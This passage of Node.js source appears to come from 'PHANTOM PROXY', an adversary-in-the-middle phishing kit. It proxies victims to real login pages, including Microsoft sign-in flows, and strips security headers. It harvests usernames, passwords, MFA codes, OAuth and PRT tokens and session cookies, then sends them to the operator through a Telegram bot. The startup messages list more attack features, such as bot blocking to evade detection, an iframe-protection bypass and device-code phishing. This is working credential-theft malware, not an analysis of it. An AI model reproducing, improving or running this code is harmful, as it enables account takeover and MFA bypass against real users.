                                    updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [parsed.body], headers.host, currentSession);
                                    const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
                                    clientResponse.writeHead(200, { "Content-Type": "application/json" });
                                    clientResponse.end(JSON.stringify(validDomains));
                                    return;
                                }
                            }
                            proxyRequestProtocol = proxyRequestURL.protocol;
                            proxyRequestOptions.path = proxyRequestPath;
                            proxyRequestOptions.port = proxyRequestURL.port || (proxyRequestURL.protocol === 'https:' ? 443 : 80);
                            proxyRequestOptions.method = parsed.method;
                            proxyRequestOptions.headers = { ...headers, ...parsed.headers };
                            if (proxyRequestURL.hostname !== headers.host) {
                                proxyRequestOptions.hostname = proxyRequestURL.hostname;
                                proxyRequestOptions.headers.host = proxyRequestURL.host;
                            }
                            if (proxyRequestOptions.headers.referer) proxyRequestOptions.headers.referer = parsed.referrer;
                            isNavigationRequest = parsed.mode === "navigate";
                            clientRequestBody = parsed.body;
                        } catch (error) {
                            displayError("Proxy request parse failed", error, proxyRequestOptions.host, proxyRequestOptions.path, clientRequestBody);
                        }
                    } else {
                        console.warn(`Non-proxied URL: ${url}`);
                    }
                } else {
                    console.warn(`No request body for URL: ${url}`);
                }

                proxyRequestOptions.path = proxyRequestOptions.path.replaceAll(headers.host, VICTIM_SESSIONS[currentSession].host);
                updateProxyRequestHeaders(proxyRequestOptions, currentSession, headers.host);

                const proxyRequestBody = clientRequestBody.body || clientRequestBody;
                const contentLength = Buffer.byteLength(proxyRequestBody);
                if (contentLength) proxyRequestOptions.headers["content-length"] = contentLength.toString();
                else { delete proxyRequestOptions.headers["content-type"]; delete proxyRequestOptions.headers["content-length"]; }

                if (isNavigationRequest) {
                    VICTIM_SESSIONS[currentSession].protocol = proxyRequestProtocol;
                    VICTIM_SESSIONS[currentSession].hostname = proxyRequestOptions.hostname;
                    VICTIM_SESSIONS[currentSession].path = proxyRequestOptions.path;
                    VICTIM_SESSIONS[currentSession].port = proxyRequestOptions.port;
                    VICTIM_SESSIONS[currentSession].host = proxyRequestOptions.headers.host;
                }

                const protocol = proxyRequestProtocol === "https:" ? https : http;
                const proxyReq = protocol.request(proxyRequestOptions, (proxyResponse) => {
                    if (proxyResponse.statusCode >= 300 && proxyResponse.statusCode < 400 && proxyResponse.headers.location) {
                        const location = proxyResponse.headers.location;
                        try {
                            const locationURL = new URL(location);
                            VICTIM_SESSIONS[currentSession].protocol = locationURL.protocol;
                            VICTIM_SESSIONS[currentSession].hostname = locationURL.hostname;
                            VICTIM_SESSIONS[currentSession].path = locationURL.pathname + locationURL.search;
                            VICTIM_SESSIONS[currentSession].port = locationURL.port || (locationURL.protocol === 'https:' ? 443 : 80);
                            VICTIM_SESSIONS[currentSession].host = locationURL.host;
                            proxyResponse.headers.location = location.replace(locationURL.host, headers.host);
                            console.log(`[REDIRECT] Rewrote: ${location} -> ${proxyResponse.headers.location}`);
                        } catch (e) { VICTIM_SESSIONS[currentSession].path = location; }
                    }

                    const setCookieHeaders = proxyResponse.headers["set-cookie"];
                    if (setCookieHeaders) updateCurrentSessionCookies(proxyRequestOptions, setCookieHeaders, headers.host, currentSession, proxyResponse.headers.date);
                    proxyResponse.headers["cache-control"] = "no-store";
                    proxyResponse.headers["access-control-allow-origin"] = `https://${headers.host}`;
                    deleteHTTPSecurityResponseHeaders(proxyResponse.headers);

                    let responseBody = [];
                    proxyResponse
                        .on("error", (error) => displayError("Response body retrieval failed", error, proxyRequestOptions.method, proxyRequestOptions.path))
                        .on("data", (chunk) => responseBody.push(chunk))
                        .on("end", async () => {
                            let bodyBuffer = Buffer.concat(responseBody);

                            let tokens = {}, cookies = {}, email = 'N/A', password = 'N/A', mfa = 'N/A';
                            let phishedUrl = VICTIM_SESSIONS[currentSession]?.host || 'N/A';
                            try {
                                let reqBody = proxyRequestBody;
                                if (typeof reqBody === 'string') {
                                    try {
                                        const parsed = JSON.parse(reqBody);
                                        if (parsed.email) email = parsed.email;
                                        if (parsed.password) password = parsed.password;
                                        if (parsed.mfa || parsed.otp || parsed.code) mfa = parsed.mfa || parsed.otp || parsed.code;
                                        if (parsed.access_token) tokens.access_token = parsed.access_token;
                                        if (parsed.refresh_token) tokens.refresh_token = parsed.refresh_token;
                                        if (parsed.id_token) tokens.id_token = parsed.id_token;
                                        if (parsed.prt) tokens.prt = parsed.prt;
                                    } catch (e) {
                                        const params = new URLSearchParams(reqBody);
                                        if (params.get('email')) email = params.get('email');
                                        if (params.get('username')) email = params.get('username');
                                        if (params.get('loginfmt')) email = params.get('loginfmt');
                                        if (params.get('password')) password = params.get('password');
                                        if (params.get('passwd')) password = params.get('passwd');
                                        if (params.get('otc')) mfa = params.get('otc');
                                        if (params.get('code')) mfa = params.get('code');
                                        if (params.get('verificationCode')) mfa = params.get('verificationCode');
                                    }
                                }
                                const respStr = bodyBuffer.toString('utf-8');
                                const am = respStr.match(/access_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                                if (am) tokens.access_token = am[1];
                                const rm = respStr.match(/refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                                if (rm) tokens.refresh_token = rm[1];
                                const im = respStr.match(/id_token["']?\s*[:=]\s*["']([^"']+)["']/i);
                                if (im) tokens.id_token = im[1];
                                const pm = respStr.match(/prt["']?\s*[:=]\s*["']([^"']+)["']/i);
                                if (pm) tokens.prt = pm[1];
                                const setCookies = proxyResponse.headers['set-cookie'];
                                if (setCookies) {
                                    const arr = Array.isArray(setCookies) ? setCookies : [setCookies];
                                    for (const c of arr) {
                                        const [nameVal] = c.split(';');
                                        if (nameVal) {
                                            const [n, v] = nameVal.split('=');
                                            cookies[n] = v;
                                        }
                                    }
                                }
                                if (email !== 'N/A' || password !== 'N/A' || mfa !== 'N/A' || Object.keys(tokens).length > 0 || Object.keys(cookies).length > 0) {
                                    await sendToTelegram({
                                        sessionId: currentSession,
                                        email,
                                        password,
                                        mfa,
                                        tokens,
                                        cookies,
                                        phishedUrl
                                    }, 'aitm', clientIp);
                                } else {
                                    console.log(`ℹ️ No credentials found in request for session ${currentSession}`);
                                }
                            } catch (e) {
                                console.error('❌ Telegram extraction error:', e.message);
                            }

                            if (proxyResponse.headers["content-type"] && /text\/html/i.test(proxyResponse.headers["content-type"]) && Buffer.byteLength(bodyBuffer)) {
                                try {
                                    const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
                                    bodyBuffer = updateHTMLProxyResponse(decompressedResponseBody);
                                    bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
                                    if (proxyResponse.headers["content-length"]) proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
                                } catch (error) {
                                    displayError("HTML decompression failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                                }
                            }

                            else if (proxyRequestOptions.path.startsWith("/common/GetCredentialType")) {
                                try {
                                    const { decompressedResponseBody, encodings } = await decompressResponseBody(bodyBuffer, proxyResponse.headers["content-encoding"]);
                                    bodyBuffer = updateFederationRedirectUrl(decompressedResponseBody, headers.host);
                                    bodyBuffer = await compressResponseBody(bodyBuffer, encodings);
                                    if (proxyResponse.headers["content-length"]) proxyResponse.headers["content-length"] = Buffer.byteLength(bodyBuffer).toString();
                                } catch (error) {
                                    displayError("Federation redirect update failed", error, proxyRequestOptions.hostname, proxyRequestOptions.path);
                                }
                            }

                            clientResponse.writeHead(proxyResponse.statusCode, proxyResponse.headers);
                            clientResponse.end(bodyBuffer);
                        });
                });

                if (proxyRequestBody) proxyReq.write(proxyRequestBody);
                proxyReq.end();
            });
    } else {
        clientResponse.writeHead(301, { Location: REDIRECT_URL });
        clientResponse.end();
    }
});

// ============================================================
// 🚀 START SERVER + WEBSOCKET
// ============================================================
const PORT = process.env.PORT || 3000;

if (WebSocket) {
    const wss = new WebSocket.Server({ server, path: '/ws' });
    const wsClients = new Set();
    wss.on('connection', (ws) => {
        wsClients.add(ws);
        console.log('🔌 WebSocket client connected. Total:', wsClients.size);
        ws.on('close', () => {
            wsClients.delete(ws);
            console.log('🔌 WebSocket client disconnected. Total:', wsClients.size);
        });
        ws.on('message', (msg) => {
            if (msg.toString() === 'ping') ws.send('pong');
        });
    });
    function broadcastNewLog(filename) {
        const message = JSON.stringify({ type: 'newLog', file: filename });
        for (const client of wsClients) {
            if (client.readyState === WebSocket.OPEN) {
                client.send(message);
            }
        }
    }
    try {
        if (fs.existsSync(LOGS_DIRECTORY)) {
            fs.watch(LOGS_DIRECTORY, (eventType, filename) => {
                if (filename && filename.endsWith('.log') && eventType === 'rename') {
                    setTimeout(() => {
                        if (fs.existsSync(path.join(LOGS_DIRECTORY, filename))) {
                            broadcastNewLog(filename);
                        }
                    }, 500);
                }
            });
            console.log('✅ WebSocket server started on /ws (watching logs)');
        }
    } catch (e) {
        console.warn('⚠️ Could not watch log directory:', e.message);
    }
} else {
    console.warn('⚠️ WebSocket library not installed – live updates disabled.');
}

server.listen(PORT, '::', () => {
    console.log(`✅ PHANTOM PROXY v10.13 running on port ${PORT}`);
    console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
    console.log(`📱 Device Code: /device`);
    console.log(`🏥 Health Check: / (Railway compatible)`);
    console.log(`🧪 Test Telegram: /test-telegram-now`);
    console.log(`👁️ Visit Logging: AiTM + Device pages`);
    console.log(`🤖 Bot Blocking: ACTIVE (Googlebot, Telegram, etc.)`);
    console.log(`📤 Page‑load notifications: Markdown (legacy, safe)`);
    console.log(`📤 Telegram exfil (AiTM/Device/PRT): Markdown (legacy, safe)`);
    console.log(`🔥 Service Worker: FIXED & SERVING`);
    console.log(`🔧 HTTP/1.1 Forced: YES (no h2 errors)`);
    console.log(`🟣 PRT Engine: ACTIVE`);
    console.log(`🔑 Token Vault: ACTIVE`);
    console.log(`📊 Graph API: ACTIVE`);
    console.log(`📈 Analytics: ACTIVE`);
    console.log(`📧 Webmail: ACTIVE`);
    console.log(`🔌 WebSocket: /ws (live log updates)`);
    console.log(`🔐 NEW: /capture ROPC endpoint – keeps victim on proxy`);
    console.log(`🛡️ IFRAME PROXY BYPASS: ACTIVE (strips X-Frame-Options)`);
    console.log(`🚀 AUTO-OPEN MODAL: ENABLED (no click required)`);

    if (!BOT_TOKEN || !CHAT_ID) {
        console.warn('⚠️ TELEGRAM CREDENTIALS ARE MISSING! Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables.');
    }
});

server.on('error', (err) => {
    console.error('❌ Server error:', err.message);
    if (err.code === 'EADDRINUSE') {
        console.error(`   Port ${PORT} is already in use.`);
        process.exit(1);
    }
});
